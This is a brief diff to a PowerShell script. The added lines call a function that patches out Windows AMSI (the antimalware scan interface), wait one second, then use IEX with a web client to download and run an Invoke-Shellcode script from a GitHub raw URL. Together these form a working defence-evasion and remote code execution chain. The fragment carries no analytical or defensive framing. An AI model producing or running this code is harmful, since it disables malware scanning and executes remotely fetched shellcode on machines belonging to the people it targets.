@@ -6,3 +6,6 @@ function MyPatch{
   }
   [Bypass.AMSI]::Patch();
 }
+MyPatch;
+Start-Sleep 1;
+IEX(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/yashikun/fsociety00/master/Invoke-Shellcode.ps1');
